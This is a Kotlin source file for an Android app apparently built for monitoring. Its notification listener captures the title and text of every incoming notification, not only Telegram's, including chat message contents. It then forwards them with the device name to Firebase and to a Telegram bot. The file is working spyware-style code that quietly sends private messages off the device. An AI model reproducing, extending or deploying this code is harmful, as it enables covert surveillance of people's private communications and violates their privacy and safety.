package com.kuzatuv.app

import android.app.Notification
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class TelegramNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName
        

        val extras = sbn.notification.extras
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        var text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""

        val lines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
        if (lines != null && lines.isNotEmpty()) {
            text = lines.joinToString("\n") { it.toString() }
        }

        val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
        if (messages != null && messages.isNotEmpty()) {
            val bundle = messages.last() as? Bundle
            val msgText = bundle?.getCharSequence("text")?.toString()
            if (!msgText.isNullOrEmpty()) text = msgText
        }

        if (title.isEmpty() && text.isEmpty()) return

        val device = DevicePrefs.getDeviceName(applicationContext)
        FirebaseHelper.pushTelegram(title, text, System.currentTimeMillis(), device)
        TelegramHelper.send("📨 Telegram ($device)\n$title:\n$text")
    }
}
